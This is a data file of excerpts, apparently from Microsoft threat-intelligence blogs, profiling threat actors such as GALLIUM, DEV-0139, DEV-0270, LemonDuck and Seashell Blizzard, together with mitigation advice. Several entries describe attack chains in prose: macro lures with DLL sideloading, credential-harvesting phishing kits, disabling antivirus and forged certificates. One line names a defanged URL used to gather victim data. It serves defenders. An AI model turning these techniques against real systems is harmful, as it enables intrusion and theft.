"Introduction", "content": "If your organization supplies the energy industry, you may be targeted by adversaries who want to disrupt the power supply. One way they will try to access your company resources is by stealing or guessing user credentials with tactics like password spray or phishing. According to Verizon's 2019 Data Breach Investigations Report, 80 percent of breaches are the result of weak or compromised passwords. Attackers target multiple people at a time, but they only need to succeed once to gain access. \nSecuring your company starts with safeguarding your identities. At the bare minimum, you should apply multi-factor authentication (MFA) to your administrative accounts. A better option is to require all users to authenticate using MFA. MFA requires that users sign in with more than just a password. The second form of authentication can be a one-time code from a mobile device, biometrics, or a secure FIDO2 key, among other options. MFA reduces your risk significantly because it's much harder for an attacker to compromise two or more authentication factors. ", "source": "microsoft"}, {"title": "Introduction", "content": "StilachiRAT gathers extensive system information, including OS details, device identifiers, BIOS serial numbers, and camera presence. Information is collected through the Component Object Model (COM) Web-based Enterprise Management (WBEM) interfaces using WMI Query Language (WQL). Below are some of the queries it executes: ", "source": "microsoft"}, {"title": "Introduction", "content": "This blog describes several notable TTPs used by this threat actor as well as recommendations to defend against related attacks. As with any observed nationstate actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the necessary information to secure their environments. \nPROTECTION INFO \nGet mitigation, detection, and hunting guidance ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Threat Intelligence \nAttacker techniques, tools, and infrastructure Vulnerabilities and exploits \nMicrosoft Threat Intelligence Center (MSTIC) is raising awareness of the ongoing activity by a group we call GALLIUM, targeting telecommunication providers. When Microsoft customers have been targeted by this activity, we notified them directly with the relevant information they need to protect themselves. By sharing the detailed methodology and indicators related to GALLIUM activity, we're encouraging the security community to implement active defenses to secure the broader ecosystem from these attacks. \nTo compromise targeted networks, GALLIUM target unpatched internet-facing services using publicly available exploits and have been known to target vulnerabilities in WildFly/JBoss. Once persistence is established in a network, GALLIUM uses common techniques and tools like Mimikatz to obtain credentials that allows for lateral movement across the target network. Within compromised networks, GALLIUM makes no attempt to obfuscate their intent and are known to use common versions of malware and publicly available toolkits with small modifications. The operators rely on low cost and easy to replace infrastructure that consists of dynamic-DNS domains and regularly reused hop points. \nThis activity from GALLIUM has been identified predominantly through 2018 to mid-2019. GALLIUM is still active; however, activity levels have dropped when compared to what was previously observed. \nFollowing Microsoft's internal practices of assigning chemical elements to activity groups, GALLIUM is the code name for this activity group. ", "source": "microsoft"}, {"title": "defend", "content": "Additionally, MSTIC has authored a number of antimalware signatures for Windows Defender Antivirus covering the aforementioned malware families, a list of GALLIUM exclusive signature can be found in the Related indicators\" section. \nIn addition to these malware families, GALLIUM has been observed employing SoftEther VPN software to facilitate access and maintain persistence to a target network. By installing SoftEther on internal systems, GALLIUM is able to connect through that system as though they are on the internal network of the target. SoftEther provides GALLIUM with another means of persistence and flexibility with the added benefit that its traffic may appear to be benign on the target network. ", "source": "microsoft"}, {"title": "Defense", "content": "The following are recommended defenses security operations teams can take to mitigate the impact of threats like GALLIUM in your corporate environment: \nMaintain web server patching and log audits, run web services with minimum required operating system permissions   \nInstall security updates on all applications and operating systems promptly. Check the Security Update Guide for detailed information about available Microsoft security updates.   \nFor efficient incident response, maintain a forensics-ready network with centralized event logging, file detonation services, and up-to-date asset inventories.   \nEnable cloud-delivered protection and maintain updated antivirus.   \nTurn on cloud-delivered protection and automatic sample submission on Windows Defender Antivirus. These capabilities use artificial intelligence (AI) and machine learning to quickly identify and stop new and unknown threats.   \nUse behavior detection solutions to catch credential dumping or other activity that may indicate a breach.   \nAdopt Azure ATP-a cloud-based security solution that leverages your onpremises Active Directory signals-to identify, detect, and investigate advanced threats, compromised identities, and malicious insider actions directed at your organization.   \nUse Microsoft Defender ATP to help enterprise networks prevent, detect, investigate, and respond to advanced threats. Educate users about protecting personal and business information in social media, filtering unsolicited communication, identifying lures in spear-phishing email and watering holes, and reporting of reconnaissance attempts and other suspicious activity.   \nEncourage users to use Microsoft Edge and other web browsers that support SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware.   \nInstitute Multi-Factor Authentication (MFA) to mitigate against compromised accounts. Note: Microsoft strongly encourages all customers download and use passwordless solutions like the Microsoft Authenticator app or Windows Hello to secure your accounts. For Office 365 users, see MFA support. For consumer and personal email accounts, see how to use two-step verification. ", "source": "microsoft"}, {"title": "Introduction", "content": "Beyond the immediate threat of file encryption, there are several additional risks associated with human-operated ransomware events, some of which may be observed well after an investigation and the removal of the threat from the network. These risks include: ", "source": "microsoft"}, {"title": "Introduction", "content": "Over the past several years, the cryptocurrency market has considerably expanded, gaining the interest of investors and threat actors. Cryptocurrency itself has been used by cybercriminals for their operations, notably for ransom payment in ransomware attacks, but we have also observed threat actors directly targeting organizations within the cryptocurrency industry for financial gain. Attacks targeting this market have taken many forms, including fraud, vulnerability exploitation, fake applications, and usage of info stealers, as attackers attempt to get their hands on cryptocurrency funds. \nWe are also seeing more complex attacks wherein the threat actor shows great knowledge and preparation, taking steps to gain their target's trust before deploying payloads. For example, Microsoft recently investigated an attack where the threat actor, tracked as DEV-0139, took advantage of Telegram chat groups to target cryptocurrency investment companies. DEV-0139 joined Telegram groups used to facilitate communication between VIP clients and cryptocurrency exchange platforms and identified their target from among the members. The threat actor posed as representatives of another cryptocurrency investment company, and in October 2022 invited the target to a different chat group and pretended to ask for feedback on the fee structure used by cryptocurrency exchange platforms. The threat actor had a broader knowledge of this specific part of the industry, indicating that they were well prepared and aware of the current challenge the targeted companies may have. \nAfter gaining the target's trust, DEV-0139 then sent a weaponized Excel file with the name OKX Binance & Huobi VIP fee comparision.xls which contained several tables about fee structures among cryptocurrency exchange companies. The data in the document was likely accurate to increase their credibility. This weaponized Excel file initiates the following series of activities: \n1. A malicious macro in the weaponized Excel file abuses UserForm of VBA to obfuscate the code and retrieve some data.   \n2. The malicious macro drops another Excel sheet embedded in the form and executes it in invisible mode. The said Excel sheet is encoded in base64, and dropped into C:\\ProgramData\\Microsoft Media\\ with the name VSDB688.tmp   \n3. The file VSDB688.tmp downloads a PNG file containing three executables: a legitimate Windows file named logagent.exe, a malicious version of the DLL wsock32.dll, and an XOR encoded backdoor.   \n4. The file logagent.exe is used to sideload the malicious wsock32.dll, which acts as a DLL proxy to the legitimate wsock32.dll. The malicious DLL file is used to load and decrypt the XOR encoded backdoor that lets the threat actor remotely access the infected system. \nFurther investigation through our telemetry led to the discovery of another file that uses the same DLL proxying technique. But instead of a malicious Excel file, it is delivered in an MSI package for a CryptoDashboardV2 application, dated June 2022. This may suggest other related campaigns are also run by the same threat actor, using the same techniques. \nIn this blog post, we will present the details uncovered from our investigation of the attack against a cryptocurrency investment company, as well as analysis of related files, to help similar organizations understand this kind of threat, and \nprepare for possible attacks. Researchers at Volexity recently published their findings on this attack as well. \nAs with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts. Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing Microsoft Threat Intelligence Center (MSTIC) to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity. Once it meets the criteria, a DEV is converted to a named actor. ", "source": "microsoft"}, {"title": "defend", "content": "In this report we analyzed a targeted attack on cryptocurrency investment fund startups. Such companies are relatively new, but manage hundreds of millions of dollars, raising interest by threat actors. \nIn this attack we identified that the threat actor has broad knowledge of the cryptocurrency industry as well as the challenges their targets may face, increasing the sophistication of the attack and their chance of success. The threat actor used Telegram, an app widely used in the field, to identify the profile of interest, gained the target's trust by discussing relevant topics, and finally sent a weaponized document that delivered a backdoor through multiple mechanisms. Additionally, the second attack identified was luring a fake crypto dashboard application. \nThe cryptocurrency market remains a field of interest for threat actors. Targeted users are identified through trusted channels to increase the chance of success. While the biggest companies can be targeted, smaller companies can also be targets of interest. The techniques used by the actor covered in this blog can be mitigated by adopting the security considerations provided below: \nUse the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion. Educate end users about protecting personal and business information in social media, filtering unsolicited communication (in this case, Telegram chat groups), identifying lures in spear-phishing email and watering holes, and reporting of reconnaissance attempts and other suspicious activity. Educate end users about preventing malware infections, such as ignoring or deleting unsolicited and unexpected emails or attachments sent via instant messaging applications or social networks. Encourage end users to practice good credential hygiene and make sure the Microsoft Defender Firewall (which is enabled by default) is always on to prevent malware infection and stifle propagation. Change Excel macro security settings to control which macros run and under what circumstances when you open a workbook. Customers can also stop malicious XLM or VBA macros by ensuring runtime macro scanning by Antimalware Scan Interface (AMSI) is on. This feature-enabled by default-is on if the Group Policy setting for Macro Run Time Scan Scope is set to \"Enable for All Files\" or \"Enable for Low Trust Files\". Turn on attack surface reduction rules to prevent common attack techniques observed in this threat: \nBlock Office applications from creating executable content Block Office communication application from creating child processes Block Win32 API calls from Office macros \nEnsure that Microsoft Defender Antivirus is up to date and that real-time behavior monitoring is enabled. ", "source": "microsoft"}, {"title": "Introduction", "content": "While the two threat actors are exploiting the same vulnerability, Microsoft observed Diamond Sleet and Onyx Sleet utilizing unique sets of tools and techniques following successful exploitation. Based on the profile of victim organizations affected by these intrusions, Microsoft assesses that the threat actors may be opportunistically compromising vulnerable servers. However, both actors have deployed malware and tools and utilized techniques that may enable persistent access to victim environments. \nSLEET ACTORS ", "source": "microsoft"}, {"title": "Introduction", "content": "DEV-0569 has multiple methods for delivery of their initial payload. In some cases, DEV-0569 payloads are delivered via phishing campaigns run by other malicious actors that offer delivery of malware payloads as a service. \nHistorical observation of typical DEV-0569 attack begins with malicious links delivered to targets via malicious ads, fake forum pages, blog comments, or through phishing emails. These links lead to malicious files signed by the attacker using a legitimate certificate. The malicious files, which are malware downloaders known as BATLOADER, pose as installers or updates for legitimate applications like Microsoft Teams or Zoom. When launched, BATLOADER uses MSI Custom Actions to launch malicious PowerShell activity or run batch scripts to aid in disabling security solutions and lead to the delivery of various encrypted malware payloads that is decrypted and launched with PowerShell commands. ", "source": "microsoft"}, {"title": "defend", "content": "DEV-0569 will likely continue to rely on malvertising and phishing to deliver malware payloads. Solutions such as network protection and Microsoft Defender SmartScreen can help thwart malicious link access. Microsoft Defender for Office 365 helps guard against phishing by inspecting the email body and URL for known patterns. Since DEV-0569's phishing scheme abuses legitimate services, organizations can also leverage mail flow rules to capture suspicious keywords or review broad exceptions, such as those related to IP ranges and domain-level allow lists. Enabling Safe Links for emails, Microsoft Teams, and Office Apps can also help address this threat. \nDefenders can also apply the following mitigations to reduce the impact of this threat: \nEncourage users to use Microsoft Edge and other web browsers that support SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware. Turn on network protection to block connections to malicious domains and IP addresses.   \nBuild organizational resilience against email threats by educating users about identifying social engineering attacks and preventing malware infection. Use Attack simulation training in Microsoft Defender for Office 365 to run attack scenarios, increase user awareness, and empower employees to recognize and report these attacks.   \nPractice the principle of least-privilege and maintain credential hygiene. Avoid the use of domain-wide, admin-level service accounts. Restricting local administrative privileges can help limit installation of RATs and other unwanted applications.   \nTurn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats.   \nTurn on tamper protection features to prevent attackers from stopping security services. \nMicrosoft Defender customers can turn on attack surface reduction rules to prevent common attack techniques used in ransomware attacks: \nBlock process creations originating from PsExec and WMI commands   \nBlock executable files from running unless they meet a prevalence, age, or   \ntrusted list criterion   \nUse advanced protection against ransomware ", "source": "microsoft"}, {"title": "Introduction", "content": "People are inclined to be fair. In fact, receiving a gift triggers a neurological response in the areas of the brain associated with decision-making. If my friend buys me lunch on Friday, I will feel obliged to buy her lunch the next time we go out. Social psychologists have shown that if people receive a holiday card from a stranger, 20 percent will send one back.[4] And providing a mint at the end of a meal can increase tipping by 18-21 percent. \nHow reciprocity is used in phishing: You can see evidence of the Principle of Reciprocity in phishing campaigns and other scams. For example, an attacker may send an email that includes a free coupon and then ask the user to sign up for an account. \nLeveraging reciprocity to reduce phishing: According to Dr. Cialdini, the lesson of \"the Principle of Reciprocity is to be the first to give...\" Many organizations pay for lunch to get people to come to trainings, but you may also consider giving away gift certificates for coffee or a fun T-shirt. If the gift is personal and unexpected, it's even more effective. After you give, ask people to commit to your security principles. Many will feel compelled to do so. ", "source": "microsoft"}, {"title": "Introduction", "content": "The XLS.HTML phishing campaign uses social engineering to craft emails mimicking regular financial-related business transactions, specifically sending what seems to be vendor payment advice. In some of the emails, attackers use accented characters in the subject line. \nThe email attachment is an HTML file, but the file extension is modified to any or variations of the following: \nxls.HTML ? xslx.HTML Xls.html .XLS.html xls.htML xls.HtMl xls.htM xsl_x.h_T_M_L .xls.html ._xslx.hTML ._xsl_x.hTML \nUsing xls in the attachment file name is meant to prompt users to expect an Excel file. When the attachment is opened, it launches a browser window and displays a fake Microsoft Office 365 credentials dialog box on top of a blurred Excel document. Notably, the dialog box may display information about its targets, such as their email address and, in some instances, their company logo. See below: \nThe dialog box prompts the user to re-enter their password, because their access to the Excel document has supposedly timed out. However, if the user enters their password, they receive a fake note that the submitted password is incorrect. Meanwhile, the attacker-controlled phishing kit running in the background harvests the password and other information about the user. ", "source": "microsoft"}, {"title": "Introduction", "content": "In the May 2021 wave, a new module was introduced that used hxxps://showips[.]com/api/geoip/ to fetch the user's IP address and country data and sent them to a command and control (C2) server. As previously mentioned, attackers could use such information, along with usernames and passwords, as their initial entry point for later infiltration attempts. ", "source": "microsoft"}, {"title": "Defense", "content": "The highly evasive nature of this threat and the speed with which it attempts to evolve requires comprehensive protection. Microsoft Defender for Office 365 detects malicious emails from this phishing campaign through diverse, multilayered, and cloud-based machine learning models and dynamic analysis. In addition to inspecting emails and attachments based on known malicious signals, Microsoft Defender for Office 365 leverages learning models that inspect email message and header properties to determine the reputation of both the sender (for example, sender IP reputation) and recipient of the message. \nMicrosoft Defender for Office 365 has a built-in sandbox where files and URLs are detonated and examined for maliciousness, such as specific file characteristics, processes called, and other behavior. For this phishing campaign, once the HTML attachment runs on the sandbox, rules check which websites are opened, if the JavaScript files decoded are malicious or not, and even if the images used are spoofed or legitimate. \nMicrosoft Defender for Office 365 is also backed by Microsoft experts who continuously monitor the threat landscape for new attacker tools and techniques. The speed that attackers use to update their obfuscation and encoding techniques demonstrates the level of monitoring expertise required to enrich intelligence for this campaign type. \nThreat data from other Microsoft 365 Defender services enhance protections delivered by Microsoft Defender for Office 365 to help detect and block malicious components related to this campaign and the other attacks that may stem from credentials this campaign steals. Microsoft 365 Defender correlates threat data on files, URLs, and emails to provide coordinated defense. \nFinally, this blog entry details the techniques attackers used in each iteration of the campaign, enabling defenders to enhance their protection strategy against these emerging threats. Defenders can apply the security configurations and other prescribed mitigations that follow. Defenders can also run the provided custom queries using advanced hunting in Microsoft 365 Defender to proactively check their network for attacks related to this campaign. ", "source": "microsoft"}, {"title": "Introduction", "content": "Media reports $(1,2,3)$ indicate that PSOAs often sell Windows exploits and malware in hacking-as-a-service packages to government agencies. Agencies in Uzbekistan, United Arab Emirates, and Saudi Arabia are among the list of Candiru's alleged previous customers. These agencies, then, likely choose whom to target and run the cyberoperations themselves. \nMicrosoft has identified over 100 victims of SOURGUM's malware, and these victims are as geographically diverse as would be expected when varied government agencies are believed to be selecting the targets. Approximately half of the victims were found in Palestinian Authority, with most of the remaining victims located in Israel, Iran, Lebanon, Yemen, Spain (Catalonia), United Kingdom, Turkey, Armenia, and Singapore. To be clear, the identification of victims of the malware in a country doesn't necessarily mean that an agency in that country is a SOURGUM customer, as international targeting is common. \nAny Microsoft 365 Defender and Microsoft Defender for Endpoint alerts containing detection names for the DevilsTongue malware name are signs of compromise by SOURGUM's malware. We have included a comprehensive list of detection names below for customers to perform additional hunting in their environments. ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft Defender Antivirus detects DevilsTongue malware with the following detections: \nTrojan:Win32/DevilsTongue.A!dha Trojan:Win32/DevilsTongue.B!dha Trojan:Script/DevilsTongueIni.A!dha   \nVirTool:Win32/DevilsTongueConfig.A!dha   \nHackTool:Win32/DevilsTongueDriver.A!dha ", "source": "microsoft"}, {"title": "Introduction", "content": "As with most software supply chain compromises, this new attack was carried out silently. It was one of numerous attacks detected and automatically remediated by Windows Defender ATP on a typical day. \nWhile customers were immediately protected, our threat hunting team began an in-depth investigation when similar infection patterns started emerging across different sets of machines: Antivirus capabilities in Windows Defender ATP was detecting and blocking a coin mining process masquerading as pagefile.sys, which was being launched by a service named xbox-service.exe. Windows Defender ATP's alert timeline showed that xbox-service.exe was installed by an installer package that was automatically downloaded from a suspicious remote server. \nA machine compromised with coin miner malware is relatively easy to remediate. However, investigating and finding the root cause of the coin miner infection without an advanced endpoint detection and response (EDR) solution like Windows Defender ATP is challenging; tracing the infection requires a rich timeline of events. In this case, Advanced hunting capabilities in Windows Defender ATP can answer three basic questions: \nWhat created xbox-service.exe and pagefile.sys files on the host? Why is xbox-service.exe being launched as a service with high privileges? What network and process activities were seen just before xbox-service.exe was launched? \nAnswering these questions is painless with Windows Defender ATP. Looking at the timeline of multiple machines, our threat hunting team was able to confirm that an offending installer package (MSI) was downloaded and written onto devices through a certain PDF editor app (an alternative app to Adobe Acrobat Reader). \nThe malicious MSI file was installed silently as part of a set of font packages; it was mixed in with other legitimate MSI files downloaded by the app during installation. All the MSI files were clean and digitally signed by the same legitimate company \u2013 except for the one malicious file. Clearly, something in the download and installation chain was subverted at the source, an indication of software supply chain attack. \nAs observed in previous supply chain incidents, hiding malicious code inside an installer or updater program gives attackers the immediate benefit of having full elevated privileges (SYSTEM) on a machine. This gives malicious code the permissions to make system changes like copying files to the system folder, adding a service, and running coin mining code. \nConfident with the results of our investigation, we reported findings to the vendor distributing the PDF editor app. They were unaware of the issue and immediately started investigating on their end. \nWorking with the app vendor, we discovered that the vendor itself was not compromised. Instead, the app vendor itself was the victim of a supply chain attack traceable to their dependency on a second software vendor that was responsible for creating and distributing the additional font packages used by the app. The app vendor promptly notified their partner vendor, who was able to identify and remediate the issue and quickly interrupted the attack. ", "source": "microsoft"}, {"title": "defend", "content": "Software supply chain attacks raise new challenges in security given that they take advantage of common everyday tasks like software installation and update. Given the increasing prevalence of these types of attacks, organizations should investigate the following security solutions: \nAdopt a walled garden ecosystem for devices, especially for critical systems. Windows 10 in S mode is designed to allow only apps installed from the Microsoft Store, ensuring Microsoft-verified security Deploy strong code integrity policies. Application control can be used to restrict the applications that users are allowed to run. It also restricts the code that runs in the system core (kernel) and can block unsigned scripts and other forms of untrusted code for customers who can't fully adopt Windows 10 in S mode. Use endpoint detection and response (EDR) solutions. Endpoint detection and response capabilities in Windows Defender ATP can automatically detect and remediate suspicious activities and other post-breach actions, so even when entry vector is stealthy like for software supply chain, Windows Defender ATP can help to detect and contain such incidents sooner. \nIn supply chain attacks, the actual compromise happens outside the network, but organizations can detect and block malware that arrive through this method. The built-in security technologies in Windows Defender Advanced Threat Protection (Windows Defender ATP) work together to create a unified endpoint security platform. For example, as demonstrated in this investigation, antivirus capabilities detected the coin mining payload. The detection was surfaced on Windows Defender ATP, where automated investigation resolved the attack, protecting customers. The rich alert timeline and advanced hunting capabilities in Windows Defender ATP showed the extent of the software supply chain attack. Through this unified platform, Windows Defender ATP delivers attack surface reduction, nextgeneration protection, endpoint detection and response, automated investigation and response, and advanced hunting. ", "source": "microsoft"}, {"title": "Introduction", "content": "On July 11, 2023, Microsoft published two blogs detailing a malicious campaign by a threat actor tracked as Storm-0558 that targeted customer email that we've detected and mitigated: Microsoft Security Response Center and Microsoft on the Issues. As we continue our investigation into this incident and deploy defense in depth measures to harden all systems involved, we're providing this deeper analysis of the observed actor techniques for obtaining unauthorized access to email data, tools, and unique infrastructure characteristics. \nSeptember 6, 2023 update \u2013 Microsoft has completed a comprehensive technical investigation into Storm- $.0558^{\\prime}s$ acquisition of the Microsoft account consumer signing key. Investigation findings are released on the Microsoft Security Response Center blog: Results of major technical investigations for Storm-0558 key acquisition. \nAugust 2024 update \u2013 Microsoft now tracks Storm-0558 as Antique Typhoon. \nAs described in more detail in our July 11 blogs, Storm-0558 is a China-based threat actor with espionage objectives. Beginning May 15, 2023, Storm-0558 used forged authentication tokens to access user email from approximately 25 organizations, including government agencies and related consumer accounts in the public cloud. No other environment was impacted. Microsoft has successfully blocked this campaign from Storm-0558. As with any observed nation-state actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments. \nSince identification of this malicious campaign on June 16, 2023, Microsoft has identified the root cause, established durable tracking of the campaign, disrupted malicious activities, hardened the environment, notified every impacted customer, and coordinated with multiple government entities. We continue to investigate and monitor the situation and will take additional steps to protect customers. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Threat Intelligence \nApril 2023 update \u2013 Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. \nTo learn more about this evolution, how the new taxonomy represents the origin, unique traits, and impact of threat actors, and a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy. \nMicrosoft threat intelligence teams have been tracking multiple ransomware campaigns and have tied these attacks to DEV-0270, also known as Nemesis Kitten, a sub-group of Iranian actor PHOSPHORUS. Microsoft assesses with moderate confidence that DEV-0270 conducts malicious network operations, including widespread vulnerability scanning, on behalf of the government of Iran. However, judging from their geographic and sectoral targeting, which often lacked a strategic value for the regime, we assess with low confidence that some of DEV-0270's ransomware attacks are a form of moonlighting for personal or company-specific revenue generation. This blog profiles the tactics and techniques behind the DEV0270/PHOSPHORUS ransomware campaigns. We hope this analysis, which Microsoft is using to protect customers from related attacks, further exposes and disrupts the expansion of DEV-0270's operations. \nDEV-0270 leverages exploits for high-severity vulnerabilities to gain access to devices and is known for the early adoption of newly disclosed vulnerabilities. DEV0270 also extensively uses living-off-the-land binaries (LOLBINs) throughout the attack chain for discovery and credential access. This extends to its abuse of the built-in BitLocker tool to encrypt files on compromised devices. \nIn some instances where encryption was successful, the time to ransom (TTR) between initial access and the ransom note was around two days. The group has been observed demanding USD 8,000 for decryption keys. In addition, the actor has been observed pursuing other avenues to generate income through their operations. In one attack, a victim organization refused to pay the ransom, so the actor opted to post the stolen data from the organization for sale packaged in a SQL database dump. \nUsing these observations, this blog details the group's tactics and techniques across its end-to-end attack chain to help defenders identify, investigate, and mitigate attacks. We also provide extensive hunting queries designed to surface stealthy attacks. This blog also includes protection and hardening guidance to help organizations increase resilience against these and similar attacks. ", "source": "microsoft"}, {"title": "Defense", "content": "DEV-0270 uses a handful of defensive evasion techniques to avoid detection. The threat actors typically turn off Microsoft Defender Antivirus real-time protection to prevent Microsoft Defender Antivirus from blocking the execution of their custom binaries. The threat group creates or activates the DefaultAccount account to add it to the Administrators and Remote Desktop Users groups. The modification of the DefaultAccount provides the threat actor group with a legitimate pre-existing account with nonstandard, higher privileges. DEV-0270 also uses powershell.exe to load their custom root certificate to the local certificate database. This custom certificate is spoofed to appear as a legitimate Microsoft-signed certificate. \nHowever, Windows flags the spoofed certificate as invalid due to the unverified certificate signing chain. This certificate allows the group to encrypt their malicious communications to blend in with other legitimate traffic on the network. \nAdditionally, DEV-0270 heavily uses native LOLBins to effectively avoid detection. The threat group commonly uses native WMI, net, CMD, and PowerShell commands and registry configurations to maintain stealth and operational security. They also install and masquerade their custom binaries as legitimate processes to hide their presence. Some of the legitimate processes they masquerade their tools as include: dllhost.exe, task_update.exe, user.exe, and CacheTask. Using .bat files and powershell.exe, DEV-0270 might terminate existing legitimate processes, run their binary with the same process name, and then configure scheduled tasks to ensure the persistence of their custom binaries. ", "source": "microsoft"}, {"title": "Introduction", "content": "LemonDuck activity initiated from external applications \u2013 as against self-spreading methods like malicious phishing mail \u2013 is generally much more likely to begin with or lead to human-operated activity. These activities always result in more invasive secondary malware being delivered in tandem with persistent access being maintained through backdoors. These human-operated activities result in greater impact than standard infections. \nIn March and April 2021, various vulnerabilities related to the ProxyLogon set of Microsoft Exchange Server exploits were utilized by LemonDuck to install web shells and gain access to outdated systems. Attackers then used this access to launch additional attacks while also deploying automatic LemonDuck components and malware. \nIn some cases, the LemonDuck attackers used renamed copies of the official Microsoft Exchange On-Premises Mitigation Tool to remediate the vulnerability they had used to gain access. They did so while maintaining full access to compromised devices and limiting other actors from abusing the same Exchange vulnerabilities. \nThis self-patching behavior is in keeping with the attackers' general desire to remove competing malware and risks from the device. This allows them to limit visibility of the attack to SOC analysts within an organization who might be prioritizing unpatched devices for investigation, or who would overlook devices that do not have a high volume of malware present. \nThe LemonDuck operators also make use of many fileless malware techniques, which can make remediation more difficult. Fileless techniques, which include persistence via registry, scheduled tasks, WMI, and startup folder, remove the need for stable malware presence in the filesystem. These techniques also include utilizing process injection and in-memory execution, which can make removal nontrivial. It is therefore imperative that organizations that were vulnerable in the past also direct action to investigate exactly how patching occurred, and whether malicious activity persists. \nOn the basic side of implementation this can mean registry, scheduled task, WMI and startup folder persistence to remove the necessity for stable malware presence in the filesystem. However, many free or easily available RATs and Trojans are now routinely utilizing process injection and in-memory execution to circumvent easy removal. To rival these kinds of behaviors it's imperative that security teams within organizations review their incident response and malware removal processes to include all common areas and arenas of the operating system where malware may continue to reside after cleanup by an antivirus solution. ", "source": "microsoft"}, {"title": "Protection", "content": "The cross-domain visibility and coordinated defense delivered by Microsoft 365 Defender is designed for the wide range and increasing sophistication of threats that LemonDuck exemplifies. Below we list mitigation actions, detection information, and advanced hunting queries that Microsoft 365 Defender customers can use to harden networks against threats from LemonDuck and other malware operations. ", "source": "microsoft"}, {"title": "Introduction", "content": "Seashell Blizzard is a high-impact threat actor linked to the Russian Federation that conducts global activities on behalf of Russian Military Intelligence Unit 74455 (GRU). Seashell Blizzard's specialized operations have ranged from espionage to information operations and cyber-enabled disruptions, usually in the form of destructive attacks and manipulation of industrial control systems (ICS). Active since at least 2013, this threat actor's prolific operations include destructive attacks such as KillDisk (2015) and FoxBlade (2022), supply-chain attacks (MeDoc, 2017), and pseudo-ransomware attacks such as NotPetya (2017) and Prestige (2022), in addition to numerous other specialized disruptive capabilities. Seashell Blizzard is assessed to be highly skilled at enabling broad and persistent access against priority computer networks, which sometimes gives the group significant tenure for future potential follow-on activity. \nDue to their specialization in computer network exploitation (CNE) and expertise targeting critical infrastructure such as ICS and supervisory control and data acquisition systems (SCADA), Seashell Blizzard's operations have frequently been leveraged during military conflicts and as an adaptable element during contentious geopolitical events. Historically, some of Seashell Blizzard's operations may be considered part of a spectrum of retaliatory actions sometimes used by the Russian Federation. Since Russia's invasion of Ukraine in 2022, Seashell Blizzard has \nThe BadPilot campaign: Seashell Blizzard subgroup conducts multiyear global access operation | Microsoft Security Blog conducted a steady stream of operations complementing Russian military objectives. The threat actor's longstanding strategic targets in the region have included critical infrastructure such as energy and water, government, military, transportation and logistics, manufacturing, telecommunications, and other supportive civilian infrastructure. \nSince at least April 2023, Seashell Blizzard has increased targeting of military communities in the region, likely for tactical intelligence gain. Their persistent targeting of Ukraine suggests Seashell Blizzard is tasked to obtain and retain access to high-priority targets to provide the Russian military and Russian government a range of options for future actions. \nSeashell Blizzard's network intrusions leverage diverse tradecraft and typically employ a range of common publicly available tools, including Cobalt Strike and DarkCrystalRAT. Network intrusions linked to the threat actor have affected multiple tiers of infrastructure, showcasing Seashell Blizzard's abilities to target end users, network perimeters, and vertical-specific systems leveraging both publicly available and custom exploits and methods. \nSince February 2022, Seashell Blizzard has generally taken three approaches to their network intrusions: \nTargeted: Seashell Blizzard has frequently used tailored mechanisms to access targets, including scanning and exploitation of specific victim infrastructure, phishing, and modifying legitimate functionality of existing systems to either expand network access or obtain confidential information.   \nOpportunistic: Seashell Blizzard has increasingly used broad exploitation of Internet-facing infrastructure and distribution of malware implants spread through trojanized software to achieve scalable but indiscriminate access. In cases where a resulting victim is identified as strategically valuable, Microsoft Threat Intelligence has observed the threat actor conducting significant postcompromise activities. Hybrid: Seashell Blizzard has very likely gained access to target organizations using a limited supply-chain attack narrowly focused within Ukraine, an operation that was recently mitigated by the Computer Emergency Response Team of Ukraine (CERT-UA). Other hybrid methods have included compromise of regional managed IT service providers, which often afforded regional or vertical-specific access to diverse targets. \nSeashell Blizzard overlaps with activity tracked by other security vendors as BE2, UAC-0133, Blue Echidna, Sandworm, PHANTOM, BlackEnergy Lite, and APT44. ", "source": "microsoft"}, {"title": "Conclusion", "content": "Given that Seashell Blizzard is Russia's cyber tip of the spear in Ukraine, Microsoft Threat Intelligence assesses that this access subgroup will continue to innovate new horizontally scalable techniques to compromise networks both in Ukraine and globally in support of Russia's war objectives and evolving national priorities. This subgroup, which is characterized within the broader Seashell Blizzard organization by its near-global reach, represents an expansion in both the geographical targeting conducted by Seashell Blizzard and the scope of its operations. At the same time, Seashell Blizzard's far-reaching, opportunistic access methods likely offer Russia expansive opportunities for niche operations and activities that will continue to be valuable over the medium term. ", "source": "microsoft"}, {"title": "Introduction", "content": "By John Lambert, Distinguished Engineer and Corporate Vice President, Microsoft Threat Intelligenc https://www.microsoft.com/en-us/security/blog/2023/04/18/microsoft-shifts-to-a-new-threat-actor-naming-taxonomy/ better context to customers and security researchers that are already confronted with an overwhelming amount of threat intelligence data. It will offer a more organized, memorable, and easy way to reference adversary groups so that organizations can better prioritize threats and protect themselves. Simply put, security professionals will instantly have an idea of the type of threat actor they are up against, just by reading the name. \nThe Microsoft Threat Intelligence community has spent over a decade discovering, tracking, and identifying targeted malicious activity and sharing that critical intelligence with customers. Our threat research has grown to track more than 300 unique threat actors, including 160 nation-state actors, 50 ransomware groups, and hundreds of others. A global multi-disciplinary assembly of threat intelligence analysts, pen testers, and data scientists work together alongside experts in geopolitics and disinformation to take a whole-of-adversary approach. This helps Microsoft Threat Intelligence teams fully understand the what of an attack, make assessments on the why, then forecast and implement protections for where an attacker might go next. Our vision is that this new naming model helps our customers and the industry move to a more proactive approach to defense. \nWe realize that other vendors in the industry also have unique naming taxonomies representing their distinct view of threats based on their intelligence. However, there are often overlaps or close alignments with tracked actors, 